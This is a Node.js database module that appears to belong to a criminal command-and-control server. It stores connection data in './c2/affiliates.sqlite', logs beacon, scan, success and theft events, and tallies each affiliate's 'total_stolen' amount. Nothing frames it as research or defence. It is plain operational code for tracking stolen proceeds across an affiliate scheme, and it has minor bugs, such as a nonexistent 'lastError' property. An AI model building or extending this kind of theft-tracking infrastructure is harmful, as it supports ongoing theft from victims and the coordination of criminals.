const sqlite3 = require("sqlite3").verbose();

// Initialize a global, persistent database connection instance within this module
let dbInstance;

/** Gets or initializes the singleton database connection. */
function getDb() {
    if (!dbInstance) {
        // Assuming setup in server.js handles initial schema creation upon startup
        dbInstance = new sqlite3.Database('./c2/affiliates.sqlite', (err) => {
            if (err) {
                console.error("Error initializing DB connection:", err.message);
            } else {
                console.log('DB Module: Successfully connected to SQLite database.');
            }
        });
    }
    return dbInstance;
}

/** Logs an incoming event (Beacon, Scan, Success, Theft). */
function logEvent(hash, type, payload, ts) {
    const db = getDb();
    return new Promise((resolve, reject) => {
        db.run(`INSERT INTO events (hash, type, payload, ts) VALUES (?,?,?,?)`,
            [hash, type, JSON.stringify(payload), ts], function(err) {
            if (err) return reject({ error: "Logging failure", details: err.message });
            resolve(true);
        });
    });
}

/** Logs the affiliate's primary hit record if it's new or updated. */
function logAffiliateUpdate(hash, amount, ts) {
    const db = getDb();
    return new Promise((resolve, reject) => {
        // This uses the logic defined in your 'success' endpoint: update total stolen
        db.run(`UPDATE affiliates SET total_stolen = COALESCE(total_stolen + ?, 0) WHERE hash = ?;`,
            [amount, hash], function(err) {
            if (err) return reject({ error: "Update failure", details: err.message });
            resolve(this.changes > 0 || this.lastError === null); // Resolve based on success or record update
        });
    });
}

module.exports = { getDb, logEvent, logAffiliateUpdate };
